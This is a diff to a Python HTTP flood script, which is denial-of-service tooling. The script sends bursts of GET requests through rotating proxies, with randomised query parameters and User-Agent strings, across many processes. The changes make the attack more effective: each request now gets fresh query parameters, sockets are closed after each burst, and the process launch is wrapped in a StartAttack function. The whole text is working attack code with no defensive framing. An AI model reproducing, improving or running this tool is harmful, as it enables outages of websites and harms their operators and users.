@@ -98,8 +98,9 @@ def checkProxies():
         f.write(proxy)
     f.close()
 
+time.sleep(1)
+
 def Flood():
-    valueParams = "?{}={}&{}={}".format(rC(queryParams), rI(1, 65535), rC(queryParams), rI(1, 65535))
     proxy = rC(proxies).strip().split(":")
     Connection = "Connection: Keep-Alive\r\n"
     while True:
@@ -111,11 +112,13 @@ def Flood():
                 sslContext = ssl.SSLContext()
                 s = sslContext.wrap_socket(s, server_hostname=targetHost)
             for _ in range(100):
+                valueParams = "?{}={}&{}={}".format(rC(queryParams), rI(1, 65535), rC(queryParams), rI(1, 65535))
                 Accept = rC(AcceptHeaders)
                 User_Agent = "User-Agent: " + rC(userAgentList) + "\r\n\r\n"
                 floodHeader = "GET {}{} HTTP/1.1\r\nHost: {}\r\n".format(targetPath, valueParams, targetHost) + Connection + Accept + User_Agent
                 floodHeader = floodHeader.encode()
                 s.send(floodHeader)
+            s.close()
             print("Flood sent " + proxy[0] + ":" + proxy[1])
         except socket.error:
             time.sleep(.1)
@@ -142,8 +145,10 @@ userAgentList = []
 for _ in range(100):
     userAgent = UserAgent().random
     userAgentList.append(userAgent)
-for indexPicker in range(threadNumber):
-    thread = multiprocessing.Process(target=Flood)
-    thread.setDaemon = False
-    thread.start()
+def StartAttack():
+    for _ in range(threadNumber):
+        thread = multiprocessing.Process(target=Flood)
+        thread.setDaemon = False
+        thread.start()
+StartAttack()
 
